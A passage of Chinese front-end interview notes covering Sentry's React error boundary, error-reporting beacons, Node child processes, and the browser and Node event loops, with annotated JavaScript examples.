declare <span class="token keyword">class</span> <span class="token class-name">ErrorBoundary</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span><span class="token operator">&lt;</span>ErrorBoundaryProps<span class="token punctuation">,</span> ErrorBoundaryState<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    state<span class="token operator">:</span> ErrorBoundaryState<span class="token punctuation">;</span>
    <span class="token function">componentDidCatch</span><span class="token punctuation">(</span>error<span class="token operator">:</span> Error<span class="token punctuation">,</span> <span class="token punctuation">{</span> componentStack <span class="token punctuation">}</span><span class="token operator">:</span> React<span class="token punctuation">.</span>ErrorInfo<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
    <span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
    <span class="token function">componentWillUnmount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
    <span class="token function-variable function">resetErrorBoundary</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> React<span class="token punctuation">.</span>ReactNode<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 真实上报的地方</span>
<span class="token class-name">ErrorBoundary</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">componentDidCatch</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> _a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> _this <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> componentStack <span class="token operator">=</span> _a<span class="token punctuation">.</span>componentStack<span class="token punctuation">;</span>
  <span class="token comment">// 获取到配置的props</span>
  <span class="token keyword">var</span> _b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">,</span> beforeCapture <span class="token operator">=</span> _b<span class="token punctuation">.</span>beforeCapture<span class="token punctuation">,</span> onError <span class="token operator">=</span> _b<span class="token punctuation">.</span>onError<span class="token punctuation">,</span> showDialog <span class="token operator">=</span> _b<span class="token punctuation">.</span>showDialog<span class="token punctuation">,</span> dialogOptions <span class="token operator">=</span> _b<span class="token punctuation">.</span>dialogOptions<span class="token punctuation">;</span>
  <span class="token function">withScope</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">scope</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 上报之前做一些处理，相当于axios的请求拦截器</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>beforeCapture<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">beforeCapture</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> error<span class="token punctuation">,</span> componentStack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 上报</span>
    <span class="token keyword">var</span> eventId <span class="token operator">=</span> <span class="token function">captureException</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> <span class="token punctuation">{</span> contexts<span class="token operator">:</span> <span class="token punctuation">{</span> react<span class="token operator">:</span> <span class="token punctuation">{</span> componentStack<span class="token operator">:</span> componentStack <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 开发者的回调</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>onError<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">onError</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> componentStack<span class="token punctuation">,</span> eventId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 是否显示sentry的错误反馈组件（也是一种收集错误的方式）</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>showDialog<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">showReportDialog</span><span class="token punctuation">(</span><span class="token function">__assign</span><span class="token punctuation">(</span><span class="token function">__assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> dialogOptions<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> eventId<span class="token operator">:</span> eventId <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// componentDidCatch is used over getDerivedStateFromError</span>
    <span class="token comment">// so that componentStack is accessible through state.</span>
    _this<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> error<span class="token operator">:</span> error<span class="token punctuation">,</span> componentStack<span class="token operator">:</span> componentStack<span class="token punctuation">,</span> eventId<span class="token operator">:</span> eventId <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><h5 id="监控上报发送"><a href="#监控上报发送" class="header-anchor">#</a> 监控上报发送</h5> <p>监控拿到报错信息之后，接下来就需要将捕捉到的错误信息发送到信息收集平台上，常用的发送形式主要有两种:</p> <ul><li>通过 Ajax 发送数据</li> <li>动态创建 img 标签的形式</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span>url<span class="token punctuation">,</span>line</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">var</span> <span class="token constant">REPORT_URL</span> <span class="token operator">=</span> <span class="token string">&quot;xxxx/cgi&quot;</span><span class="token punctuation">;</span> <span class="token comment">// 收集上报数据的信息</span>
   <span class="token keyword">var</span> m <span class="token operator">=</span><span class="token punctuation">[</span>msg<span class="token punctuation">,</span> url<span class="token punctuation">,</span> line<span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">,</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 收集错误信息，发生错误的脚本文件网络地址，用户代理信息，时间</span>
   <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token constant">REPORT_URL</span> <span class="token operator">+</span> m<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 组装错误上报信息内容URL</span>
   <span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">;</span>
   img<span class="token punctuation">.</span>onload <span class="token operator">=</span> img<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      img <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span><span class="token punctuation">;</span>
   img<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span><span class="token comment">// 发送数据到后台cgi</span>
<span class="token punctuation">}</span>
<span class="token comment">// 监听错误上报</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span>url<span class="token punctuation">,</span>line</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token function">error</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span>url<span class="token punctuation">,</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h4 id="_7-js单线程理解"><a href="#_7-js单线程理解" class="header-anchor">#</a> 7:js单线程理解</h4> <p>JavaScript的单线程，与它的用途有关。<strong>作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM</strong>。这决定了它只能是单线程，否则会带来很复杂的同步问题。</p> <p>为了利用多核CPU的计算能力，HTML5提出<strong>Web Worker标准，允许JavaScript脚本创建多个线程</strong>，但是<strong>子线程完全受主线程控制，且不得操作DOM</strong>。所以，这个新标准并没有改变JavaScript单线程的本质。</p> <p><strong>node遵循的是单线程单进程的模式</strong>；node的单线程模式，只维持一个主线程，大大减少了线程间切换的开销。<strong>但是node的单线程使得在主线程不能进行CPU密集型操作，否则会阻塞主线程。</strong></p> <ul><li>对于CPU密集型操作，在node中<strong>通过child_process可以创建独立的子进程，父子进程通过IPC通信</strong>，子进程可以是外部应用也可以是node子程序，子进程执行后可以将结果返回给父进程。</li> <li><strong>为了调度多核CPU等资源，node还提供了cluster模块，利用多核CPU的资源</strong>，使得可以通过一串node子进程去处理负载任务，同时保证一定的负载均衡型。</li></ul> <h5 id="spawn-exec-execflie-fork区别"><a href="#spawn-exec-execflie-fork区别" class="header-anchor">#</a> spawn/exec/execFlie/fork区别</h5> <p>创建子进程的方法大致有：</p> <ul><li>spawn()： 启动一个子进程来执行命令</li> <li>exec(): 启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况</li> <li>execFlie(): 启动一个子进程来执行可执行文件</li> <li>fork(): 与spawn()类似，不同电在于它创建Node子进程需要执行js文件</li> <li>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性设置超时时间，一旦创建的进程超过设定的时间就会被杀死</li> <li>exec()与execFile()不同的是，exec()适合执行已有命令，execFile()适合执行文件。</li></ul> <p><img src="/rat-summ/assets/img/image-20211019203117537.a56adab0.png" alt="image-20211019203117537"></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> cp<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> child<span class="token operator">=</span>cp<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./child'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
child<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'got a message is'</span><span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
child<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="_8-宏微队列"><a href="#_8-宏微队列" class="header-anchor">#</a> 8:宏微队列</h4> <h5 id="js-运行机制"><a href="#js-运行机制" class="header-anchor">#</a> JS 运行机制</h5> <p>简单来说可以按以下几个步骤：</p> <ol><li><p><strong>所有同步任务都在主线程上执行</strong>，形成一个执行栈（execution context stack）。</p></li> <li><p>主线程之外，<strong>还存在一个&quot;任务队列&quot;（task queue）</strong>。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。主线程发现有异步任务，就在“任务队列”之中加入一个任务事件。</p></li> <li><p><strong>一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;（先进先出原则）</strong>。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</p></li> <li><p><strong>主线程不断重复上面的第三步</strong>。也就是常说的事件循环(Event Loop)。</p></li></ol> <p>一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以<strong>本质上来说 JS 中的异步还是同步行为。</strong></p> <h5 id="event-loop流程-加入了任务"><a href="#event-loop流程-加入了任务" class="header-anchor">#</a> Event loop流程(加入了任务)</h5> <p>如果任务队列中有多个异步任务，那么先执行哪个任务呢？<strong>于是在异步任务中，也进行了等级划分，分为宏任务（macrotask）和微任务（microtask）；</strong></p> <ol><li>执行同步代码，这属于宏任务（macrotask）；(script第一步)</li> <li>执行过程中如果遇到微任务就加入微任务队列，遇到宏任务就加入宏任务队列;</li> <li>执行栈为空，查询是否有微任务需要执行；宏任务执行完毕后，检查当前微任务队列，如果有，就依次执行（一轮事件循环结束）</li> <li><strong>必要的话渲染 UI</strong>；</li> <li>然后开始下一轮 Event loop，执行宏任务中的异步代码；</li></ol> <p>通过上述的 Event loop 顺序可知，<strong>如果宏任务中的异步代码有大量的计算并且需要操作 DOM 的话，为了更快的 界面响应，我们可以把操作 DOM 放入微任务中。</strong></p> <h5 id="浏览器与node的event-loop差异"><a href="#浏览器与node的event-loop差异" class="header-anchor">#</a> 浏览器与Node的Event Loop差异</h5> <blockquote><p><em><strong>浏览器环境下，microtask的任务队列是每个macrotask执行完之后执行。</strong></em> <strong>而在Node.js中，microtask会在事件循环的各个阶段之间执行，也就是一个阶段执行完毕，就会去执行microtask队列的任务</strong></p></blockquote> <p>浏览器和Node 环境下，<strong>microtask 任务队列的执行时机不同</strong></p> <ul><li>浏览器端，microtask 在事件循环的 macrotask 执行完之后执行 ,<strong>间接插入</strong>；</li> <li>Node端，microtask 在事件循环的各个阶段之间执行，<strong>阶段插入</strong>；</li></ul> <p><strong>图示区别</strong></p> <p><img src="/rat-summ/assets/img/681221b2-af72-46e2-bb00-9760702a8b77.4ea5ad71.png" alt="img"></p> <p><img src="/rat-summ/assets/img/4831d8c8-7e9b-4b45-98d2-66d10fb85a24.20c8ec0e.png" alt="img"></p> <h5 id="队列区别【要点】"><a href="#队列区别【要点】" class="header-anchor">#</a> 队列区别【要点】</h5> <p>一次执行多个微任务；但是一次只能执行一个宏任务；【<strong>三步走：1：同步；2：微任务；3：宏任务；</strong>】</p> <p><strong>浏览器端</strong>事件循环中的异步队列有两种：macro（宏任务）队列和 micro（微任务）队列。<strong>宏任务队列可以有多个，微任务队列只有一个</strong>。  在 ES6 规范中，microtask 称为 <code>jobs</code>，macrotask 称为 <code>task</code>。<strong>【2主微】【超红】</strong></p> <p>规范中规定 task 分为两大类，分别是宏任务（macro task）和微任务 （micro task），并且每个 macro task 结束后，都要清空所有的 micro task。 想起来vue中的nextTick的内部实现；【PM SS】</p> <ul><li><p>常见的micro-task（<strong>微任务</strong>）</p> <p>比如：process.nextTick,  promise.then()，Object.observe(已废弃)、MutationObserver(html5新特性) 等。 <strong>process.nextTick优先级高于Promise.then</strong></p></li> <li><p>常见的macro-task（<strong>宏任务</strong>）</p> <p>比如：<strong>script（整体代码）</strong>、setImmediate、setTimeout、setInterval、<strong>I/O 操作、UI 渲染(rendering)</strong>、<strong>promise中的executor</strong>等。</p></li></ul> <table><thead><tr><th>宏任务</th> <th>浏览器</th> <th>Node</th></tr></thead> <tbody><tr><td><strong>I/O</strong></td> <td>✅</td> <td>✅</td></tr> <tr><td><strong>setTimeout</strong></td> <td>✅</td> <td>✅</td></tr> <tr><td><strong>setInterval</strong></td> <td>✅</td> <td>✅</td></tr> <tr><td><strong>setImmediate</strong></td> <td>❌</td> <td>✅</td></tr> <tr><td><strong>requestAnimationFrame</strong></td> <td>✅</td> <td>❌</td></tr></tbody></table> <table><thead><tr><th>微任务</th> <th>浏览器</th> <th>Node</th></tr></thead> <tbody><tr><td><strong>Promise.prototype.then catch finally</strong></td> <td>✅</td> <td>✅</td></tr> <tr><td><strong>process.nextTick</strong></td> <td>❌</td> <td>✅</td></tr> <tr><td><strong>MutationObserver</strong></td> <td>✅</td> <td>❌</td></tr></tbody></table> <p><code>process.nextTick</code>和<code>setImmidate</code>是只支持Node环境的。</p> <h5 id="requestanimationframe-raf-2"><a href="#requestanimationframe-raf-2" class="header-anchor">#</a> requestAnimationFrame(RAF)</h5> <p>requestAnimationFrame 并不是定时器，但和 setTimeout 很相似，<strong>在没有 requestAnimationFrame 的浏览器一般都是用 setTimeout 模拟</strong>。</p> <p>requestAnimationFrame 跟屏幕刷新同步，大多数屏幕的刷新频率都是 60Hz，对应的 requestAnimationFrame 大概每隔 16.7ms 触发一次，<strong>如果屏幕刷新频率更高，requestAnimationFrame 也会更快触发</strong>。基于这点，在支持 requestAnimationFrame 的浏览器还使用 setTimeout 做动画显然是不明智的。</p> <p>在不支持 requestAnimationFrame 的浏览器，如果使用 setTimeout/setInterval 来做动画，最佳延迟时间也是 <code>16.7ms</code>。 如果太小，<strong>很可能连续两次或者多次修改 dom 才一次屏幕刷新，这样就会丢帧，动画就会卡；如果太大，显而易见也会有卡顿的感觉</strong>。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">testRequestAnimationFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> label <span class="token operator">=</span> <span class="token string">'requestAnimationFrame'</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span>label<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span>label<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="案例-2"><a href="#案例-2" class="header-anchor">#</a> <strong>案例</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">t</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//最后输出的顺序是4 3 2 1。</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
  <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//7</span>
<span class="token punctuation">}</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//3</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setTimeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//9</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//4</span>
  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//8</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'nextTick'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//6</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//5</span>
<span class="token comment">// script start</span>
<span class="token comment">// async1 start</span>
<span class="token comment">// async2</span>
<span class="token comment">// promise1</span>
<span class="token comment">// script end</span>
<span class="token comment">// promise2</span>
<span class="token comment">// async1 end</span>
<span class="token comment">// setTimeOut</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h4 id="_9-node-js的运行机制"><a href="#_9-node-js的运行机制" class="header-anchor">#</a> 9.Node.js的运行机制</h4> <h5 id="运行机制过程"><a href="#运行机制过程" class="header-anchor">#</a> 运行机制过程</h5> <blockquote><p><strong>4个步骤，解调执回</strong></p></blockquote> <ul><li><strong>V8引擎解析JavaScript脚本</strong>。</li> <li><strong>解析后的代码，调用Node API</strong>。</li> <li><strong><a href="https://github.com/libuv/libuv" target="_blank" rel="noopener noreferrer">libuv库<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>负责Node API的执行</strong>。它<strong>将不同的任务分配给不同的线程，形成一个Event Loop（事件循环</strong>），以异步的方式将任务的执行结果返回给V8引擎。</li> <li>V8引擎再将结果返回给用户。</li></ul> <h5 id="_6个阶段【pcctii】【要点】"><a href="#_6个阶段【pcctii】【要点】" class="header-anchor">#</a> 6个阶段【<strong>PCCTII</strong>】【要点】</h5> <p>其中libuv引擎中的事件循环分为 6 个阶段，它们会按照顺序反复运行。每当进入某一个阶段的时候，都会从对应的回调队列中取出函数去执行。当队列为空或者执行的回调函数数量到达系统设定的阈值，就会进入下一阶段。</p> <p>从上图中，大致看出node中的事件循环的顺序：</p> <p>外部输入数据【第<strong>0</strong>步】--&gt;<strong>轮询阶段(poll)【第1步】</strong>--&gt;<strong>检查阶段(check)【第2步】</strong>--&gt;关闭事件回调阶段(close callback)【第<strong>3</strong>步】--&gt;</p> <p><strong>定时器检测阶段(timer)【第4步】</strong>--&gt;I/O事件回调阶段(I/O callbacks)【第<strong>5</strong>步】--&gt;闲置阶段(idle, prepare)【第<strong>6</strong>步】--&gt;轮询阶段（按照该顺序反复运行）...</p> <p>总过程：</p> <ul><li><code>4:timers 阶段</code>：这个阶段执行timer（<strong>setTimeout、setInterval</strong>）的回调【第<strong>4</strong>步】</li> <li><code>5:I/O callbacks 阶段</code>：处理一些上一轮循环中的少数未执行的 I/O 回调【第<strong>5</strong>步】</li> <li><code>6:idle, prepare 阶段</code>：仅node内部使用【第<strong>6</strong>步】</li> <li><code>1:poll 阶段</code>：获取新的I/O事件, <strong>适当的条件下node将阻塞在这里</strong>【第<strong>1</strong>步】</li> <li><code>2:check 阶段</code>：执行 <strong>setImmediate()</strong> 的回调【第<strong>2</strong>步】</li> <li><code>3:close callbacks 阶段</code>：执行 <strong>socket 的 close 事件回调</strong>【第<strong>3</strong>步】</li></ul> <p>主要关注其中的3个阶段：<strong>timer、poll和check，其中poll队列相对复杂</strong>：</p> <p>注意：<strong>上面六个阶段都不包括 process.nextTick()</strong></p> <h5 id="setimmediate与settimeout"><a href="#setimmediate与settimeout" class="header-anchor">#</a> setImmediate与setTimeout</h5> <blockquote><p>首先 setTimeout(fn, 0) === setTimeout(fn, 4)，这是由源码决定的;</p></blockquote> <ul><li>在 